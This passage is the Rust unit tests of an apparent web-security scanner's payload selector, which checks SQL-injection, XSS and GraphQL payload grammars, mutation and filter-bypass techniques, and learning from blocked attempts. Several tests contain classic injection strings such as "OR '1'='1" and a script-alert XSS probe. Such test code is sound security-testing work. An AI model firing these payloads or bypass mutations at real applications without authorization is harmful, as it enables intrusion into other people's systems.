        let stats = selector.stats();

        assert_eq!(stats.total_payloads, 0);
        assert!(stats.adaptive_enabled);
    }

    #[test]
    fn test_default_payloads() {
        let payloads = SmartPayloadSelector::default_payloads_for_category(&PayloadCategory::SqlInjection);

        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.payload.contains("OR '1'='1")));
    }

    #[test]
    fn test_generate_mutations() {
        let selector = SmartPayloadSelector::new(None);
        let mutations = selector.generate_mutations("<script>alert(1)</script>", PayloadCategory::Xss);

        assert!(!mutations.is_empty());
        assert!(mutations.iter().any(|m| m.contains("SCRIPT")));
    }

    #[test]
    fn test_sqli_grammar() {
        let selector = SmartPayloadSelector::new(None);
        let grammar = selector.sqli_grammar();

        assert_eq!(grammar.name, "SQLi");
        assert!(!grammar.rules.is_empty());
    }

    #[test]
    fn test_xss_grammar() {
        let selector = SmartPayloadSelector::new(None);
        let grammar = selector.xss_grammar();

        assert_eq!(grammar.name, "XSS");
        assert!(!grammar.rules.is_empty());
    }

    #[test]
    fn test_graphql_grammar() {
        let selector = SmartPayloadSelector::new(None);
        let grammar = selector.graphql_grammar();

        assert_eq!(grammar.name, "GraphQL");
        assert!(!grammar.rules.is_empty());
    }

    #[test]
    fn test_payload_learning() {
        let mut learning = PayloadLearning::new("test-app".to_string());

        learning.record_success(PayloadCategory::Xss, "<script>alert(1)</script>".to_string());
        learning.record_failure(PayloadCategory::Xss, "<blocked>".to_string());

        assert!(learning.get_recommended(PayloadCategory::Xss).is_some());
        assert!(learning.should_avoid(PayloadCategory::Xss, "<blocked>"));
        assert!(!learning.should_avoid(PayloadCategory::Xss, "<script>"));
    }

    #[test]
    fn test_bypass_techniques() {
        let selector = SmartPayloadSelector::new(None);

        assert!(selector.bypass_strategies.contains(&BypassTechnique::CaseVariation));
        assert!(selector.bypass_strategies.contains(&BypassTechnique::UrlEncode));
    }

    #[test]
    fn test_record_result() {
        let mut selector = SmartPayloadSelector::new(None);

        // Manually add a payload
        let payload = SmartPayload {
            payload: "test".to_string(),
            category: PayloadCategory::Xss,
            severity: PayloadSeverity::High,
            bypass_techniques: vec![],
            expected_behavior: ExpectedBehavior::ContainsString("test".to_string()),
            success_score: 50,
            last_success: None,
            test_count: 0,
            success_count: 0,
            priority: 100,
        };

        selector
            .payloads
            .insert(PayloadCategory::Xss, vec![payload]);

        selector.record_result(PayloadCategory::Xss, "test", true);

        let payloads = selector.payloads.get(&PayloadCategory::Xss).unwrap();
        assert_eq!(payloads[0].test_count, 1);
        assert_eq!(payloads[0].success_count, 1);
        assert!(payloads[0].last_success.is_some());
    }

    #[test]
    fn test_select_payloads() {
        let selector = SmartPayloadSelector::new(None);
        let selected = selector.select_payloads(PayloadCategory::Xss, None);

        // Should return empty since no payloads are loaded
        assert!(selected.is_empty());
    }
}
